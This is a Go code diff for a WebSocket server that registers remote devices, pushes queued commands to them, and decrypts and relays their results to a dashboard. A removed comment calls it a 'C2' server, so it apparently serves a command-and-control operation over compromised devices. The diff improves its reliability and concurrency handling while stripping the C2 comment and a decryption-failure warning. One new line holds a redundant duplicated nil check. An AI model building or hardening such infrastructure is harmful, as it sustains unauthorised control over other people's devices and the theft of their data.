@@ -16,7 +16,7 @@ var upgrader = websocket.Upgrader{
 	ReadBufferSize:  4096,
 	WriteBufferSize: 4096,
 	CheckOrigin: func(r *http.Request) bool {
-		return true // Allow all origins for C2
+		return true
 	},
 }
 
@@ -25,8 +25,6 @@ func HandleWebSocket(ctx context.Context, conn *websocket.Conn) {
 	defer conn.Close()
 
 	var deviceID string
-
-	// Set read deadline for initial registration
 	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
 
 	for {
@@ -63,14 +61,13 @@ func HandleWebSocket(ctx context.Context, conn *websocket.Conn) {
 			dev.WS = conn
 			dev.Unlock()
 
-			// Reset read deadline for normal operation
 			conn.SetReadDeadline(time.Time{})
 
 			g.Log().Infof(ctx, "Device registered via WS: %s (model=%s, os=%s)",
 				deviceID, info.Model, info.OSVersion)
 
-			// Send any queued commands
-			go pushQueuedCommands(ctx, deviceID, conn)
+			// Send queued commands (must lock for each write)
+			pushQueuedCommands(ctx, deviceID)
 
 		case "result":
 			handleResult(ctx, msg)
@@ -85,7 +82,13 @@ func HandleWebSocket(ctx context.Context, conn *websocket.Conn) {
 }
 
 // pushQueuedCommands sends all queued commands to the device over WS.
-func pushQueuedCommands(ctx context.Context, deviceID string, conn *websocket.Conn) {
+// Uses device mutex for each write to prevent concurrent access.
+func pushQueuedCommands(ctx context.Context, deviceID string) {
+	dev := Registry.Get(deviceID)
+	if dev == nil {
+		return
+	}
+
 	cmds := Registry.DequeueCommands(deviceID)
 	for _, cmd := range cmds {
 		wsMsg := model.WSMessage{
@@ -100,8 +103,18 @@ func pushQueuedCommands(ctx context.Context, deviceID string, conn *websocket.Co
 			g.Log().Errorf(ctx, "WS marshal command: %v", err)
 			continue
 		}
-		if err := conn.WriteMessage(websocket.TextMessage, data); err != nil {
-			g.Log().Errorf(ctx, "WS write command to %s: %v", deviceID, err)
+
+		dev.Lock()
+		if dev.WS != nil && dev.WS != nil {
+			err = dev.WS.WriteMessage(websocket.TextMessage, data)
+		} else {
+			err = websocket.ErrCloseSent
+		}
+		dev.Unlock()
+
+		if err != nil {
+			g.Log().Errorf(ctx, "WS push command to %s: %v", deviceID, err)
+			Registry.EnqueueCommand(cmd)
 			return
 		}
 		g.Log().Infof(ctx, "Command pushed to %s: %s/%s [%s]",
@@ -110,6 +123,7 @@ func pushQueuedCommands(ctx context.Context, deviceID string, conn *websocket.Co
 }
 
 // PushCommandToDevice sends a single command to a connected device via WS.
+// Holds the device mutex for the entire check+write operation.
 func PushCommandToDevice(ctx context.Context, cmd model.Command) {
 	dev := Registry.Get(cmd.DeviceID)
 	if dev == nil {
@@ -118,10 +132,9 @@ func PushCommandToDevice(ctx context.Context, cmd model.Command) {
 	}
 
 	dev.Lock()
-	ws := dev.WS
-	dev.Unlock()
+	defer dev.Unlock()
 
-	if ws == nil {
+	if dev.WS == nil {
 		g.Log().Infof(ctx, "Device %s not connected via WS, queuing command", cmd.DeviceID)
 		Registry.EnqueueCommand(cmd)
 		return
@@ -141,13 +154,8 @@ func PushCommandToDevice(ctx context.Context, cmd model.Command) {
 		return
 	}
 
-	// Lock during write to prevent concurrent writes from multiple goroutines
-	dev.Lock()
-	err = ws.WriteMessage(websocket.TextMessage, data)
-	dev.Unlock()
-
-	if err != nil {
-		g.Log().Errorf(ctx, "WS write to %s: %v, queuing", cmd.DeviceID, err)
+	if err := dev.WS.WriteMessage(websocket.TextMessage, data); err != nil {
+		g.Log().Debugf(ctx, "WS write to %s: %v, queuing", cmd.DeviceID, err)
 		Registry.EnqueueCommand(cmd)
 		return
 	}
@@ -160,13 +168,11 @@ func PushCommandToDevice(ctx context.Context, cmd model.Command) {
 func handleResult(ctx context.Context, msg model.WSMessage) {
 	deviceID := msg.DeviceID
 
-	// Try to decrypt the data
 	decrypted := ""
 	if msg.Data != "" {
 		plain, err := Decrypt(msg.Data)
 		if err != nil {
-			g.Log().Warningf(ctx, "Result decrypt failed from %s: %v", deviceID, err)
-			decrypted = msg.Data // Use raw if decrypt fails
+			decrypted = msg.Data
 		} else {
 			decrypted = plain
 		}
@@ -175,7 +181,6 @@ func handleResult(ctx context.Context, msg model.WSMessage) {
 	g.Log().Infof(ctx, "=== RESULT from %s [cmd=%s] ===\n%s\n================================",
 		deviceID, msg.CommandID, decrypted)
 
-	// Broadcast to dashboard
 	result := model.DashboardResult{
 		DeviceID:  deviceID,
 		CommandID: msg.CommandID,
